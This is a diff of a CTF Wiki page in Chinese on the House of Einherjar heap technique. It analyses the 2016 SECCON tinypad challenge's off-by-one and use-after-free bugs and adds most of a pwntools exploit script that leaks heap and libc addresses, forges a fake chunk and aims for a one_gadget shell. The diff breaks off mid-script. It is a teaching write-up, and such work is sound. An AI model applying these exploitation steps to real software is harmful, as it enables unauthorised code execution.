@@ -31,7 +31,9 @@
     <script type="text/javascript" src="../../_static/cloud.base.js"></script>
     <script type="text/javascript" src="../../_static/cloud.js"></script>
     <link rel="shortcut icon" href="../../_static/favicon.ico"/>
-    <link rel="search" title="搜索" href="../../search.html" /> 
+    <link rel="search" title="搜索" href="../../search.html" />
+    <link rel="next" title="House of Lore" href="house_of_lore.html" />
+    <link rel="prev" title="Chunk Extend/Shrink" href="chunk_extend_shrink.html" /> 
         <meta name="viewport" content="width=device-width, initial-scale=1">
   </head>
   <body>
@@ -43,8 +45,15 @@
         <li class="right" style="margin-right: 10px">
           <a href="../../index.html" title="內容目录"
              accesskey="C">toc</a></li>
+        <li class="right" >
+          <a href="house_of_lore.html" title="House of Lore"
+             accesskey="N">下一页</a> &nbsp; &nbsp;</li>
+        <li class="right" >
+          <a href="chunk_extend_shrink.html" title="Chunk Extend/Shrink"
+             accesskey="P">上一页</a> &nbsp; &nbsp;</li>
     <li><a href="../../index.html">CTF Wiki </a> &#187;</li>
- 
+
+          <li class="nav-item nav-item-1"><a href="index.html" accesskey="U">堆利用</a> &#187;</li> 
       </ul>
     </div>
     </div>
@@ -120,125 +129,189 @@ if (!prev_inuse(p)) {
 <li>我们需要计算目的 chunk 与 p1 地址之间的差，所以需要泄漏地址。</li>
 <li>我们需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测。</li>
 </ul>
+<p>其实，该技术与 chunk extend/shrink 技术比较类似。</p>
 </div>
 </div>
 <div class="section" id="seccon-tinypad">
-<h2>例题1-2016 Seccon tinypad<a class="headerlink" href="#seccon-tinypad" title="永久链接至标题">¶</a></h2>
+<h2>2016 Seccon tinypad<a class="headerlink" href="#seccon-tinypad" title="永久链接至标题">¶</a></h2>
 <div class="section" id="id10">
-<h3>程序基本功能分析<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h3>
-<p>通过分析程序，我们不难看出，这个程序的基本功能是操作一个tinypad，主要有以下操作</p>
+<h3>基本功能分析<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h3>
+<p>首先，可以看出，程序以来一个核心的读取函数，即读取指定长度字节的字符串，然而，当读取的长度恰好为指定的长度时，会出现 <strong>off by one 的漏洞</strong>。</p>
+<p>通过分析程序，我们不难看出，这个程序的基本功能是操作一个 tinypad，主要有以下操作</p>
 <ul class="simple">
-<li>添加</li>
-<li>删除</li>
-<li>编辑</li>
+<li>开头，程序每次开头依次判断每个 memo 的指针来判断是否为空，如果不为空，进而利用 strlen 求得其相应的长度，将 memo 的内容输出。从这里，我们也可以看出最多有 4 个 memo。</li>
+<li>添加 memo，遍历存储 memo 的变量tinypad，根据 tinypad 的存储的大小判断 memo 是否在使用，然后还有的话，分配一个 memo。从这里我们可以知道，程序只是从 tinypad 起始偏移16*16=256 处才开始使用，每个 memo
+存储两个字段，一个是该 memo 的大小，另一个是该 memo 对应的指针。所以我们可以创建一个新的结构体，并修改 ida 识别的 tinypad，使之更加可读（但是其实 ida
+没有办法帮忙智能识别。）。同时，由于该添加功能依赖于读取函数，所以存在 off by one 的漏洞。此外，我们可以看出，用户申请的 chunk 的大小最大为 256 字节，和 tinypad 前面的未使用的 256 字节恰好一致。</li>
+<li>删除，根据存储 memo 的大小判断 memo 是否在被使用，同时将相应 memo 大小设置为0，但是并没有将指针设置为 NULL，有可能会导致 Use After
+Free。<strong>即在程序开头时，就有可能输出一些相关的内容，这其实就是我们泄漏一些基地址的基础</strong>。</li>
+<li>编辑。在编辑时，程序首先根据之前存储的 memo 的内容将其拷贝到 tinypad 的前 256 个字节中，但正如我们之前所说的，当 memo 存储了 256 个字节时，就会存在 off by one漏洞。与此同时，程序利用 strlen
+判断复制之后的 tinypad 的内容长度，并将其输出。之后程序继续利用 strlen 求得 memo 的长度，并读取指定长度内容到 tinypad 中，根据读取函数，这里必然出现了 <code class="docutils literal"><span class="pre">\x00</span></code>。最后程序将读取到 tinypad 前 256
+字节的内容放到对应 memo 中。</li>
 <li>退出</li>
 </ul>
-<p>而与此同时，通过观察添加操作（因为一般只有添加后才可以编辑）</p>
-<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span> <span class="n">cmd</span> <span class="o">!=</span> <span class="s1">&#39;A&#39;</span> <span class="p">)</span>
-  <span class="n">goto</span> <span class="n">LABEL_43</span><span class="p">;</span>
-<span class="k">while</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&lt;=</span> <span class="mi">3</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">tinypad</span><span class="p">[</span><span class="mi">16</span> <span class="o">*</span> <span class="p">(</span><span class="n">idx</span> <span class="o">+</span> <span class="mi">16</span><span class="n">LL</span><span class="p">)]</span> <span class="p">)</span>
-  <span class="o">++</span><span class="n">idx</span><span class="p">;</span>
-<span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span>
-<span class="p">{</span>
-  <span class="n">writeln</span><span class="p">(</span><span class="s2">&quot;No space is left.&quot;</span><span class="p">,</span> <span class="mi">17</span><span class="n">LL</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="k">else</span>
-<span class="p">{</span>
-  <span class="n">v13</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
-  <span class="n">write_n</span><span class="p">(</span><span class="s2">&quot;(SIZE)&gt;&gt;&gt; &quot;</span><span class="p">,</span> <span class="mi">10</span><span class="n">LL</span><span class="p">);</span>
-  <span class="n">v13</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span>
-  <span class="k">if</span> <span class="p">(</span> <span class="n">v13</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
-  <span class="p">{</span>
-    <span class="n">v5</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-  <span class="p">}</span>
-  <span class="k">else</span>
-  <span class="p">{</span>
-    <span class="n">v5</span> <span class="o">=</span> <span class="n">v13</span><span class="p">;</span>
-    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">unsigned</span> <span class="n">__int64</span><span class="p">)</span><span class="n">v13</span> <span class="o">&gt;</span> <span class="mh">0x100</span> <span class="p">)</span>
-      <span class="n">v5</span> <span class="o">=</span> <span class="mi">256</span><span class="p">;</span>
-  <span class="p">}</span>
-  <span class="n">v13</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
-  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">tinypad</span><span class="p">[</span><span class="mi">16</span> <span class="o">*</span> <span class="p">(</span><span class="n">idx</span> <span class="o">+</span> <span class="mi">16</span><span class="n">LL</span><span class="p">)]</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
-  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">tinypad</span><span class="p">[</span><span class="mi">16</span> <span class="o">*</span> <span class="p">(</span><span class="n">idx</span> <span class="o">+</span> <span class="mi">16</span><span class="n">LL</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">v13</span><span class="p">);</span>
-</pre></div>
-</div>
-<p>一方面，我们可以发现该 tinypad 最多存储四个；另一方面，我们可以知道，程序只是从 tinypad 起始偏移16*16=256 处才开始使用，每个 tinypad 存储两个字段</p>
-<ul class="simple">
-<li>该 tinypad 的大小</li>
-<li>该 tinypad 对应的指针</li>
-</ul>
-<p>所以我们可以创建一个新的结构体，并修改ida识别的tinypad，使之更加可读。（但是其实ida没有办法帮忙智能识别。）</p>
-<p>此外，我们可以看出，用户申请的 chunk 的大小最大为 256 字节，和 tinypad 前面的未使用的 256 字节恰好一致。</p>
 </div>
 <div class="section" id="id11">
-<h3>漏洞发现<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h3>
-<p><strong>悬挂指针</strong></p>
-<p>在程序进行 delete 操作时， 虽然对指针进行了 free，但是并没有将指针设置为NULL，这就导致在之后仍然可以使用。</p>
-<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s1">&#39;D&#39;</span> <span class="p">)</span>                           <span class="o">//</span> <span class="n">delete</span>
-<span class="p">{</span>
-  <span class="n">write_n</span><span class="p">(</span><span class="s2">&quot;(INDEX)&gt;&gt;&gt; &quot;</span><span class="p">,</span> <span class="mi">11</span><span class="n">LL</span><span class="p">);</span>
-  <span class="n">idx</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span>
-  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">idx</span> <span class="o">&lt;=</span> <span class="mi">4</span> <span class="p">)</span>
-  <span class="p">{</span>
-    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">tinypad</span><span class="p">[</span><span class="mi">16</span> <span class="o">*</span> <span class="p">(</span><span class="n">idx</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">16</span><span class="n">LL</span><span class="p">)]</span> <span class="p">)</span>
-    <span class="p">{</span>
-      <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">void</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">tinypad</span><span class="p">[</span><span class="mi">16</span> <span class="o">*</span> <span class="p">(</span><span class="n">idx</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">16</span><span class="n">LL</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8</span><span class="p">]);</span>
-      <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">tinypad</span><span class="p">[</span><span class="mi">16</span> <span class="o">*</span> <span class="p">(</span><span class="n">idx</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">16</span><span class="n">LL</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="n">LL</span><span class="p">;</span>
-      <span class="n">writeln</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Deleted.&quot;</span><span class="p">,</span> <span class="mi">9</span><span class="n">LL</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="k">else</span>
-    <span class="p">{</span>
-      <span class="n">writeln</span><span class="p">(</span><span class="s2">&quot;Not used&quot;</span><span class="p">,</span> <span class="mi">8</span><span class="n">LL</span><span class="p">);</span>
-    <span class="p">}</span>
-  <span class="p">}</span>
-  <span class="k">else</span>
-  <span class="p">{</span>
-    <span class="n">writeln</span><span class="p">(</span><span class="s2">&quot;Invalid index&quot;</span><span class="p">,</span> <span class="mi">13</span><span class="n">LL</span><span class="p">);</span>
-  <span class="p">}</span>
+<h3>利用<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h3>
+<p>基本利用思路如下</p>
+<ol class="arabic simple">
+<li>利用删除时没有将指针置为NULL的 UAF 漏洞，泄漏堆的基地址</li>
+<li>再次利用 UAF 漏洞泄漏 libc 的基地址。</li>
+<li>利用 house of einherjar 方法在 tinypad 的前 256 字节中伪造 chunk。当我们再次申请时，那么就可以控制4个 memo 的指针和内容了。</li>
+<li>这里虽然我们的第一想法可能是直接覆盖 malloc_hook 为 one_gadget 地址，但是，由于当编辑时，程序是利用 strlen 来判读可以读取多少长度，而 malloc_hook 则在初始时为
+0。所以我们直接覆盖，所以这里采用其他方法，即修改程序的 main 函数的返回地址为 one_gadget，之所以可以行得通，是因为返回地址往往是 7f 开头的，长度足够长，可以覆盖为one_gadget。所以我们还是需要泄漏
+main 函数的返回地址，由于 libc 中存储了 main 函数 environ 指针的地址，所以我们可以先泄露出environ 的地址，然后在得知存储 main 函数的返回地址的地址。这里选取 environ 符号是因为 environ 符号在 libc
+中会导出，而像 argc 和 argv 则不会导出，相对来说会比较麻烦一点。</li>
+<li>最后修改 main 函数的返回地址为 one_gadget 地址获取shell。</li>
+</ol>
+<p>具体利用脚本如下</p>
+<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;gnome-terminal&#39;</span><span class="p">,</span> <span class="s1">&#39;-x&#39;</span><span class="p">,</span> <span class="s1">&#39;sh&#39;</span><span class="p">,</span> <span class="s1">&#39;-c&#39;</span><span class="p">]</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="n">tinypad</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./tinypad&quot;</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">7777</span><span class="p">)</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./tinypad&quot;</span><span class="p">)</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
+    <span class="n">main_arena_offset</span> <span class="o">=</span> <span class="mh">0x3c4b20</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;PID: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))</span>
+
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;(CMD)&gt;&gt;&gt; &#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;(SIZE)&gt;&gt;&gt; &#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;(CONTENT)&gt;&gt;&gt; &#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;(CMD)&gt;&gt;&gt; &#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;e&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;(INDEX)&gt;&gt;&gt; &#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;(CONTENT)&gt;&gt;&gt; &#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Is it OK?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;Y&#39;</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;(CMD)&gt;&gt;&gt; &#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;d&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;(INDEX)&gt;&gt;&gt; &#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">run</span><span class="p">():</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span>
+        <span class="s1">&#39;  ============================================================================</span><span class="se">\n\n</span><span class="s1">&#39;</span>
+    <span class="p">)</span>
+    <span class="c1"># 1. leak heap base</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x70</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>  <span class="c1"># idx 0</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x70</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>  <span class="c1"># idx 1</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span> <span class="s1">&#39;c&#39;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>  <span class="c1"># idx 2</span>
+
+    <span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>  <span class="c1"># delete idx 1</span>
+    <span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># delete idx 0, idx 0 point to idx 1</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39; # CONTENT: &#39;</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>  <span class="c1"># get pointer point to idx1</span>
+    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x80</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;get heap base: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
+
+    <span class="c1"># 2. leak libc base</span>
+    <span class="c1"># this will trigger malloc_consolidate</span>
+    <span class="c1"># first idx0 will go to unsorted bin</span>
+    <span class="c1"># second idx1 will merge with idx0(unlink), and point to idx0</span>
+    <span class="c1"># third idx1 will merge into top chunk</span>
+    <span class="c1"># but cause unlink feture, the idx0&#39;s fd and bk won&#39;t change</span>
+    <span class="c1"># so idx0 will leak the unsorted bin addr</span>
+    <span class="n">delete</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39; # CONTENT: &#39;</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">unsorted_offset_arena</span> <span class="o">=</span> <span class="mi">8</span> <span class="o">+</span> <span class="mi">10</span> <span class="o">*</span> <span class="mi">8</span>
+    <span class="n">main_arena</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="n">unsorted_offset_arena</span>
+    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">main_arena</span> <span class="o">-</span> <span class="n">main_arena_offset</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;main arena addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">main_arena</span><span class="p">))</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;libc base addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+
+    <span class="c1"># 3. house of einherjar</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x18</span><span class="p">)</span>  <span class="c1"># idx 0</span>
+    <span class="c1"># we would like trigger house of einherjar at idx 1</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mh">0xf8</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x11</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># idx 1</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span> <span class="s1">&#39;c&#39;</span> <span class="o">*</span> <span class="mh">0xf8</span><span class="p">)</span>  <span class="c1"># idx 2</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span> <span class="o">*</span> <span class="mh">0xf8</span><span class="p">)</span>  <span class="c1">#idx 3</span>
+
+    <span class="c1"># create a fake chunk in tinypad&#39;s 0x100 buffer, offset 0x20</span>
+    <span class="n">tinypad_addr</span> <span class="o">=</span> <span class="mh">0x602040</span>
+    <span class="n">fakechunk_addr</span> <span class="o">=</span> <span class="n">tinypad_addr</span> <span class="o">+</span> <span class="mh">0x20</span>
+    <span class="n">fakechunk_size</span> <span class="o">=</span> <span class="mh">0x101</span>
+    <span class="n">fakechunk</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fakechunk_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fakechunk_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span>
+        <span class="n">fakechunk_addr</span><span class="p">)</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span> <span class="o">*</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="n">fakechunk</span><span class="p">)</span>
+
+    <span class="c1"># overwrite idx 1&#39;s prev_size and</span>
+    <span class="c1"># set minaddr of size to &#39;\x00&#39;</span>
+    <span class="c1"># idx 0&#39;s chunk size is 0x20</span>
+    <span class="n">diff</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x20</span> <span class="o">-</span> <span class="n">fakechunk_addr</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;diff between idx1 and fakechunk: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">diff</span><span class="p">))</span>
+    <span class="c1"># &#39;\0&#39; padding caused by strcpy</span>
+    <span class="n">diff_strip</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">diff</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">number_of_zeros</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">diff</span><span class="p">))</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">diff_strip</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">number_of_zeros</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">diff_strip</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mh">0x18</span> <span class="o">-</span> <span class="n">i</span><span class="p">,</span> <span class="s1">&#39;f&#39;</span><span class="p">)</span>
+        <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+    <span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">Deleted.&#39;</span><span class="p">)</span>
+
+    <span class="c1"># fix the fake chunk size, fd and bk</span>
+    <span class="c1"># fd and bk must be unsorted bin</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span> <span class="o">*</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x101</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main_arena</span> <span class="o">+</span> <span class="mi">88</span><span class="p">)</span> <span class="o">+</span>
+         <span class="n">p64</span><span class="p">(</span><span class="n">main_arena</span> <span class="o">+</span> <span class="mi">88</span><span class="p">))</span>
+
+    <span class="c1"># 3. overwrite malloc_hook with one_gadget</span>
+
+    <span class="n">one_gadget_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x45216</span>
+    <span class="n">environ_pointer</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__environ&#39;</span><span class="p">]</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;one gadget addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">one_gadget_addr</span><span class="p">))</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;environ pointer addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">environ_pointer</span><span class="p">))</span>
+    <span class="c1">#fake_malloc_chunk = main_arena - 60 + 9</span>
+    <span class="c1"># set memo[0].size = &#39;a&#39;*8,</span>
+    <span class="c1"># set memo[0].content point to environ to leak environ addr</span>
+    <span class="n">fake_pad</span> <span class="o">=</span> <span class="s1">&#39;f&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x100</span> <span class="o">-</span> <span class="mh">0x20</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span>
+        <span class="n">environ_pointer</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x602148</span><span class="p">)</span>
+    <span class="c1"># get a fake chunk</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x100</span> <span class="o">-</span> <span class="mi">8</span><span class="p">,</span> <span class="n">fake_pad</span><span class="p">)</span>  <span class="c1"># idx 2</span>
+    <span class="c1">#gdb.attach(p)</span>
+
+    <span class="c1"># get environ addr</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39; # CONTENT: &#39;</span><span class="p">)</span>
